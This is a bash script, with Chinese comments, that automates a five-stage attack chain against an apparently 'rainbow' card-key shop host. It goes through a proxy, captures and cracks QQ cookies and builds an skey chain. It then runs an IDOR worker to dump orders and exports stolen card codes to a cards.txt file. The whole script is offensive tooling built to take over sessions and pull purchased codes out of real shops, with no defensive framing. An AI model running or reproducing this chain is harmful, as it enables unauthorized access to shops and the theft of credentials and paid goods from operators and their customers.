#!/bin/bash
# 统一彩虹全链 — 替代各 recon 目录 chain.sh
set -euo pipefail
FAKA=/data/tools/faka
HOST="${1:?用法: $0 host [/shop/] [contact]}"
PATH_BASE="${2:-/}"
CONTACT="${3:-}"
source "$FAKA/cookie/use_proxy.sh"

OUT="/data/tools/faka/out/chain_${HOST}"
mkdir -p "$OUT"

echo "[1/5] auto_capture"
bash "$FAKA/cookie/auto_capture.sh" "$HOST" "$PATH_BASE" "$CONTACT" 2>&1 | tee "$OUT/capture.log" || true

echo "[2/5] crack bodies"
LATEST=$(ls -td /data/tools/faka/out/captures/"$HOST"/*/ 2>/dev/null | head -1)
[ -n "$LATEST" ] && python3 "$FAKA/cookie/crack_qq_cookie.py" --input "$LATEST" --out "$OUT/crack.json" || true

echo "[3/5] skey_chain"
python3 "$FAKA/skey_chain.py" -H "$HOST" --base-path "$PATH_BASE" \
  ${LATEST:+--body-dir "$LATEST"} ${CONTACT:+--contact "$CONTACT"} \
  --proxy auto --out "$OUT/skey_chain.jsonl" --dump-dir "$OUT/dump" 2>&1 | tee -a "$OUT/chain.log"

echo "[4/5] yanzu_idor_worker"
python3 "$FAKA/yanzu_idor_worker.py" "$HOST" "$PATH_BASE" --proxy auto --out "$OUT" 2>&1 | tee -a "$OUT/chain.log" || true

echo "[5/5] rainbow_export"
python3 "$FAKA/rainbow_export.py" "$OUT/dump/orders" -o "$OUT/cards.txt" 2>/dev/null || \
python3 "$FAKA/rainbow_export.py" "$OUT/dump" -o "$OUT/cards.txt" 2>/dev/null || true

echo "DONE -> $OUT"
